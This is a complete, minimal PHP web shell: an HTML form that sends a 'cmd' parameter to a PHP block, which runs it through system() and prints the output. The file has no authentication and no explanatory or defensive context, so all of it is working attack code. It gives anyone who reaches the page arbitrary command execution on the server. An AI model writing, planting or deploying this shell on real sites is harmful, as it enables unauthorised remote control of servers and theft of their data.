<html>
<body>

<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
</form>

<pre>
<?php
    if(isset($_GET['cmd'])) {
        // Execute the command and redirect standard error to standard output (2>&1)
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>

</body>
</html>
